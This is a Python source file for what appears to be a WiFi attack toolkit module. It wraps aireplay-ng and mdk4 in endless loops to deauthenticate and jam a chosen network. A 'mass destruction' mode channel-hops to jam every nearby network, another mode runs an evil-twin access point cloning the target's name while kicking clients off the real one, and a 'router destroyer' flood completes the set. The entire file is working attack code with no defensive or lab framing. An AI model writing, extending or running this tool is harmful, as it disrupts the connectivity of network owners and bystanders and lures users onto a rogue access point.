#!/usr/bin/env python3

import os
import time
import threading
import subprocess

class AttackManager:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.attack_processes = []
        self.attack_running = False

    def single_target_attack(self):
        """Single target attack with reliable scanning"""
        print("\033[1;36m[→] Scanning for target...\033[0m")
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[💣] Targeting: {target['essid']}\033[0m")
                self.start_single_attack(target)

    def start_single_attack(self, target):
        """Start single target attack"""
        self.core.set_current_operation("SINGLE_TARGET_ATTACK")
        self.attack_running = True
        
        # Set channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        print("\033[1;31m[⚡] Starting attacks...\033[0m")
        
        # Attack 1: Continuous Deauth
        print("\033[1;31m[🔧] Starting deauth attack\033[0m")
        proc1 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg red -title 'DEAUTH-{target['essid']}' -e 'while true; do aireplay-ng --deauth 0 -a {target['bssid']} {self.core.mon_interface}; done' &",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
        
        # Attack 2: MDK4 Disruption
        print("\033[1;31m[🔧] Starting MDK4 attack\033[0m")
        proc2 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg yellow -title 'MDK4-{target['essid']}' -e 'mdk4 {self.core.mon_interface} d -c {target['channel']} -B {target['bssid']} -s 2000' &",
            background=True
        )
        if proc2:
            self.attack_processes.append(proc2)
        
        print("\033[1;32m[✅] Attacks started\033[0m")
        print("\033[1;31m[💥] Target is being jammed!\033[0m")
        
        # Animation
        anim_thread = threading.Thread(target=self.attack_animation, args=(target['essid'],))
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[⏹️] Press Enter to stop...\033[0m")
        input()
        
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✅] Attack stopped\033[0m")

    def mass_destruction(self):
        """Mass jamming that actually works"""
        print("\033[1;31m[🌐] Scanning for all networks...\033[0m")
        
        if self.scanner.wifi_scan():
            target_count = len(self.scanner.networks)
            
            if target_count == 0:
                print("\033[1;31m[✘] No networks found\033[0m")
                return
            
            print(f"\033[1;33m[🎯] Targeting {target_count} networks\033[0m")
            
            confirm = input("\033[1;31m[?] Start mass jamming? (y/N): \033[0m")
            
            if confirm.lower() in ['y', 'yes']:
                self.core.set_current_operation("MASS_DESTRUCTION")
                self.attack_running = True
                
                print("\033[1;31m[⚡] Starting mass jamming...\033[0m")
                
                # Start aggressive channel hopping deauth
                print("\033[1;31m[🔧] Starting channel hopping attack\033[0m")
                global_proc = self.core.run_command(
                    f"xterm -geometry 80x15 -bg black -fg white -title 'MASS-JAMMING' -e 'while true; do for channel in 1 2 3 4 5 6 7 8 9 10 11 12 13; do iwconfig {self.core.mon_interface} channel $channel; aireplay-ng --deauth 100 -D {self.core.mon_interface}; done; done' &",
                    background=True
                )
                if global_proc:
                    self.attack_processes.append(global_proc)
                
                # MDK4 mass destruction
                print("\033[1;31m[🔧] Starting MDK4 mass attack\033[0m")
                mdk_proc = self.core.run_command(
                    f"xterm -geometry 80x15 -bg black -fg red -title 'MDK4-MASS' -e 'mdk4 {self.core.mon_interface} d -s 5000' &",
                    background=True
                )
                if mdk_proc:
                    self.attack_processes.append(mdk_proc)
                
                print("\033[1;32m[✅] Mass jamming active\033[0m")
                print("\033[1;31m[💥] ALL networks are being jammed!\033[0m")
                print("\033[1;33m[⚠️] No devices can connect to any WiFi!\033[0m")
                
                anim_thread = threading.Thread(target=self.mass_animation)
                anim_thread.daemon = True
                anim_thread.start()
                
                print("\033[1;33m[⏹️] Press Enter to stop...\033[0m")
                input()
                
                self.stop_attacks()
                self.core.clear_current_operation()
                print("\033[1;32m[✅] Mass jamming stopped\033[0m")

    def advanced_evil_twin(self):
        """Working evil twin attack"""
        print("\033[1;36m[→] Scanning for evil twin target...\033[0m")
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;34m[👥] Creating evil twin for: {target['essid']}\033[0m")
                self.start_simple_evil_twin(target)

    def start_simple_evil_twin(self, target):
        """Simple but working evil twin"""
        try:
            self.core.set_current_operation("EVIL_TWIN")
            self.attack_running = True
            
            print("\033[1;36m[→] Setting up evil twin...\033[0m")
            
            # Stop NetworkManager
            self.core.run_command("systemctl stop NetworkManager >/dev/null 2>&1")
            time.sleep(2)
            
            # Set channel
            self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
            
            # Create simple hostapd config
            hostapd_conf = f"""interface={self.core.mon_interface}
driver=nl80211
ssid={target['essid']}
channel={target['channel']}
hw_mode=g
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""
            
            with open("/tmp/evil_twin.conf", "w") as f:
                f.write(hostapd_conf)
            
            # Create dnsmasq config
            dnsmasq_conf = f"""interface={self.core.mon_interface}
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8
"""
            
            with open("/tmp/dnsmasq.conf", "w") as f:
                f.write(dnsmasq_conf)
            
            # Configure interface
            self.core.run_command(f"ifconfig {self.core.mon_interface} 192.168.1.1 netmask 255.255.255.0 up")
            
            # Start dnsmasq
            print("\033[1;36m[→] Starting DNS/DHCP...\033[0m")
            dns_proc = self.core.run_command("dnsmasq -C /tmp/dnsmasq.conf", background=True)
            if dns_proc:
                self.attack_processes.append(dns_proc)
            
            # Start hostapd
            print("\033[1;36m[→] Starting access point...\033[0m")
            ap_proc = self.core.run_command("hostapd /tmp/evil_twin.conf", background=True)
            if ap_proc:
                self.attack_processes.append(ap_proc)
            
            time.sleep(3)
            
            # Start deauth
            print("\033[1;36m[→] Starting deauth attack...\033[0m")
            deauth_proc = self.core.run_command(
                f"xterm -geometry 80x10 -bg black -fg red -title 'DEAUTH' -e 'while true; do aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface}; sleep 2; done' &",
                background=True
            )
            if deauth_proc:
                self.attack_processes.append(deauth_proc)
            
            print("\033[1;32m[✅] Evil twin running!\033[0m")
            print(f"\033[1;32m[📡] Network: {target['essid']}\033[0m")
            print("\033[1;32m[🔓] Password: password123\033[0m")
            print("\033[1;33m[👀] Waiting for connections...\033[0m")
            
            print("\033[1;33m[⏹️] Press Enter to stop...\033[0m")
            input()
            
            self.stop_evil_twin()
            self.core.clear_current_operation()
            print("\033[1;32m[✅] Evil twin stopped\033[0m")
            
        except Exception as e:
            print(f"\033[1;31m[✘] Evil twin failed: {e}\033[0m")
            self.stop_evil_twin()

    def stop_evil_twin(self):
        """Stop evil twin"""
        self.attack_running = False
        self.stop_attacks()
        self.core.run_command("pkill hostapd")
        self.core.run_command("pkill dnsmasq")
        self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")

    def router_destroyer(self):
        """Router stress test"""
        print("\033[1;31m[💀] Scanning for router target...\033[0m")
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[💀] Targeting router: {target['essid']}\033[0m")
                self.start_router_attack(target)

    def start_router_attack(self, target):
        """Start router attack"""
        self.core.set_current_operation("ROUTER_ATTACK")
        self.attack_running = True
        
        # Set channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        print("\033[1;31m[⚡] Starting router stress...\033[0m")
        
        # Multiple attack vectors
        proc1 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg red -title 'ROUTER-STRESS' -e 'while true; do aireplay-ng --deauth 0 -a {target['bssid']} {self.core.mon_interface}; done' &",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
        
        proc2 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg yellow -title 'MDK4-STRESS' -e 'mdk4 {self.core.mon_interface} d -c {target['channel']} -B {target['bssid']} -s 3000' &",
            background=True
        )
        if proc2:
            self.attack_processes.append(proc2)
        
        print("\033[1;32m[✅] Router stress active\033[0m")
        
        anim_thread = threading.Thread(target=self.router_animation)
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[⏹️] Press Enter to stop...\033[0m")
        input()
        
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✅] Router attack stopped\033[0m")

    def attack_animation(self, essid):
        """Attack animation"""
        frames = ["⚡", "💥", "🔥", "🌪️"]
        while self.attack_running:
            for frame in frames:
                if not self.attack_running:
                    break
                print(f"\033[1;31m[{frame}] Jamming {essid} - Network completely blocked!\033[0m", end='\r')
                time.sleep(0.3)

    def mass_animation(self):
        """Mass attack animation"""
        frames = ["🌐", "⚡", "💥", "🔥"]
        while self.attack_running:
            for frame in frames:
                if not self.attack_running:
                    break
                print(f"\033[1;31m[{frame}] Mass jamming active - ALL networks blocked!\033[0m", end='\r')
                time.sleep(0.3)

    def router_animation(self):
        """Router attack animation"""
        frames = ["💀", "⚡", "💥", "🔥"]
        while self.attack_running:
            for frame in frames:
                if not self.attack_running:
                    break
                print(f"\033[1;31m[{frame}] Router stress test active!\033[0m", end='\r')
                time.sleep(0.3)

    def stop_attacks(self):
        """Stop all attacks"""
        self.attack_running = False
        self.core.stop_all_attacks()
        self.attack_processes = []
